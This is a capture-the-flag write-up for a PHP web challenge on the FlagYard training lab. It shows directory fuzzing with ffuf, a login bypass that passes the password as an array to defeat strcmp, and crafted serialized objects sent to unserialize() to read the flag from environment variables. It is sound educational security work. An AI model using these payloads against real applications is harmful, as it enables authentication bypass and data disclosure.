---
title: "FlagYard: Under Construction Write-up"
date: 2026-04-05 10:00:00
categories: [CTF]
tag: [web]
author: Aisha
---

## Challenge Description
Development is in progress.
> CTF Link: [FlagYard: Under Construction](https://flagyard.com/labs/training-labs/2/challenges/c8882a5e-5f76-4194-a177-4f620eaca9f2)

We are given a single login page to start with

![ALT](/images/UnderConstruction/1.webp)

I started by fuzzing the target and filtering the response size:

```bash
$ ffuf -u http://ywlzage0na-0.playat.flagyard.com/FUZZ -w /usr/share/wordlists/dirb/common.txt  -e .bak,.old,.php,.txt -fs 4056 -s
index.php.bak
```

This is the backup file of the index.php source code

![ALT](/images/UnderConstruction/2.webp)

The login logic:

```php
if ($username === "admin" && strcmp($password, bin2hex(random_bytes(16))) == 0)
```

It compares the password to a **random 32-character hex string** generated on the fly, which is impossible to guess. However, the function `strcmp` has a [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2018-1000628) that we can exploit to bypass the authentication, according to its [documentation](https://www.php.net/manual/en/function.strcmp.php) :

- `1`  = str1 greater than str2
- `-1` = str1 less than str2
- `0`  = equal

and by adding "`[]`" to the end of key “`password`”, the `strcmp` would return a NULL and `NULL == 0 `

![ALT](/images/UnderConstruction/3.webp)

After authenticating, the `config` POST parameter deserializes the data we provide and returns the environment variables 

```php
if (isset($_SESSION["authenticated"]) && ... && isset($_POST["config"])) {
    $config_data = $_POST["config"];
    $config = unserialize($config_data); 
    if ($config instanceof Config) {
        $message = $config->getEnvironment();
    }
}
```

Here is the class config that controls how the environment is read:

```php
class Config {
    public $env_var = "WT_PROFILE_ID";
    public $debug = false;

    public function getEnvironment() {
        if ($this->debug) {
            return "Debug mode: " . getenv("DYN_FLAG");
        }
        return getenv($this->env_var);
    }
}
```

If `$debug` is `true`, it returns the value of an environment variable called `DYN_FLAG` (the flag). Now we can simply write serialized data to specify what to read from the config class and change the debug mode to true (1) 

```php
// to read the flag: 
config=O:6:"Config":2:{s:7:"env_var";s:8:"DYN_FLAG";s:5:"debug";b:1;}

// to read the PATH env data
config=O:6:"Config":2:{s:7:"env_var";s:4:"PATH";s:5:"debug";b:0;}
```

| **`O:6:"Config"`** | **Object** | Tells PHP to create an object of the class **"Config"** (6 characters long). |
| --- | --- | --- |
| **`:2:`** | **Size** | Tells PHP this object has **2** internal variables (properties). |
| **`s:7:"env_var"`** | **Key 1** | The first variable name is **"env_var"** (a string of 7 characters). |
| **`s:8:"DYN_FLAG"`** | **Value 1** | The value assigned to `env_var` is **"DYN_FLAG"** (string of 8 chars). |
| **`s:5:"debug"`** | **Key 2** | The second variable name is **"debug"** (string of 5 chars). |
| **`b:1;`** | **Value 2** | The value for `debug` is **boolean: true** (1 = true, 0 = false). |
